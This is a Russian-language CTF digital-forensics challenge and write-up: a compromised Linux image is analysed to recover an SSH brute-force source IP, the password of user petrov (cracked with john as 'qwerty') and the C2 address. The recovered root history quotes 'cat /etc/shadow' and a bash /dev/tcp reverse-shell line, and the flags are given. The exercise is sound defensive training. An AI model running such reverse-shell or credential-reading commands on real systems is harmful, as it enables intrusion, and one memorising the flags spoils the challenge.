# Linux Forensic Quest. Uncovering the Intrusion

## Участникам

### Link file

[Linux Forensic Quest. Uncovering the Intrusion](https://drive.google.com/file/d/1WsTlMyxUZhGspobiDBFh7NgmBtkLZiNY/view?usp=share_link)

### Легенда

Вам необходимо провести расследование, связанное с компрометацией Linux-системы нашего сотрудника. Ваша задача - проанализировать криминалистический образ системы  и выявить все возможные артефакты, связанные с компрометацией.

### Задача

1. Восстановить IP-адрес хоста, с которого был получен первоначальный доступ к скомрометированному хосту.  Формат ответа RDGCTF{ipaddress}
2. Восстановить имя учетной записи и пароль в явном виде от скомпрометированного пользователя. Формат ответа RDGCTF{username_password}
3. Восстановить IP-адрес центра удаленного управления (C2), используемый злоумышленником после компрометации хоста. Формат ответа RDGCTF{ipaddress}

### Hints
- Используй программные решения для анализа криминалистических образов
- (Flag 2) Не забудь проверить журналы операционной системы и программного обеспечения
- (Flag 3) История все помнит

## Writeup

Нам дан образ скомпрометированной системы в формате vmdk. Воспользуемся одним из криминалистических инструментов для анализа образов ([Autopsy](https://www.autopsy.com/), [FTK Imager](https://www.exterro.com/ftk-imager) и др.). Мой выбор пал на FTK Imager. После добавления образа в дерево доказательств видим, что один из разделов отформатирован в файловую систему EXT4. Данный раздел имеет специфичную для Linux-систем файловую иерархию. Приступим к решению задач.

**Восстановить IP-адрес хоста, с которого был получен первоначальный доступ к скомрометированному хосту**. 
В ходе анализа не удается выявить свидетельств о наличии активных сервисов, функционирующих на узле, за исключением сервиса SSH. Данные сервис используется для организации удаленного доступа к системе. 
Проведем анализ содержимого журнала */var/log/auth.log*, где агрегируются события, связанные с попытками аутентификации в систему. Фиксируем там события, указывающие на попытки перебора учетных данных пользователя *petrov*. Брутфорс продолжался с 25.03.2023 21:57:21 по 25.03.2023 22:00:29. Уже в 22:00:30 пароль был успешно подобран.
```bash
Mar 25 22:00:24 workstation sshd[1657]: Failed password for petrov from 192.168.5.142 port 43174 ssh2
Mar 25 22:00:27 workstation sshd[1654]: Failed password for petrov from 192.168.5.142 port 43156 ssh2
Mar 25 22:00:27 workstation sshd[1656]: Failed password for petrov from 192.168.5.142 port 43170 ssh2
Mar 25 22:00:27 workstation sshd[1659]: Failed password for petrov from 192.168.5.142 port 43182 ssh2
Mar 25 22:00:27 workstation sshd[1657]: Failed password for petrov from 192.168.5.142 port 43174 ssh2
Mar 25 22:00:29 workstation sshd[1654]: Failed password for petrov from 192.168.5.142 port 43156 ssh2
Mar 25 22:00:29 workstation sshd[1656]: Failed password for petrov from 192.168.5.142 port 43170 ssh2
Mar 25 22:00:29 workstation sshd[1657]: Failed password for petrov from 192.168.5.142 port 43174 ssh2
Mar 25 22:00:29 workstation sshd[1659]: Failed password for petrov from 192.168.5.142 port 43182 ssh2
Mar 25 22:00:30 workstation sshd[1654]: Accepted password for petrov from 192.168.5.142 port 43156 ssh2
```
Как мы можем заметить, источником воздействий выступал узел с IP-адресом **192.168.5.142**.

**Восстановить имя учетной записи и пароль в явном виде от скомпрометированного пользователя.** 
Имя учетной записи мы уже выяснили на прошлом шаге. Давайте проверим стойкость пароля. Восстанавливаем файл */etc/shadow*, содержащий хеш-суммы пользовательских паролей. Для восставления пароля в открытом виде воспользуемся инструментом [john](https://www.openwall.com/john/doc/) 
```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt shadow
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
qwerty           (petrov)     
1g 0:00:00:00 DONE (2023-03-26 06:39) 8.333g/s 2133p/s 2133c/s 2133C/s 123456..freedom
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
Достаточно быстро получаем пароль - qwerty. Флаг RDGCTF{petrov_qwerty}.

**Восстановить IP-адрес центра удаленного управления (C2), используемый злоумышленником после компрометации хоста.** 
Для начала необходимо понять, что делал злоумышленник после получения удаленного доступа к системе. Обратимся к истории интерпретатора bash для пользователя petrov (*/home/petrov/.bash_history*):

```bash
sudo -i
ip a
ls -lh
group
groups 
sudo -i
shutdown
shutdown now
sudo shutdown now
```

Обращаем внимание на попытки перейти в окружении супер-пользователя с помощью команды *sudo -i*. Попытка была успешной. Это подтвержается членством petrov в группе adm (/etc/groups, /etc/sudoers) и все тем же auth.log:
```bash
...
Mar 25 22:10:11 workstation sudo:   petrov : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash
...
```
У супер-пользователя тоже есть своя история интерпретатора bash (/root/.bash_history):
```bash
exit
ls
exit
cat /etc/passwd
cat /etc/shadow
bash -i >& /dev/tcp/130.193.48.228/1337 0>&1
exit
```
Видим, что злоумышленник вывел содержимое файлов passwd и shadow, а затем предпринял попытку установления reverse shell с помощью встроенных возможностей операционной системы. Адрес C2 злоумышленника - **130.193.48.228**.

### Flags

- (Flag 1) RDGCTF{192.168.5.142}
- (Flag 2) RDGCTF{petrov_qwerty}
- (Flag 3) RDGCTF{130.193.48.228}
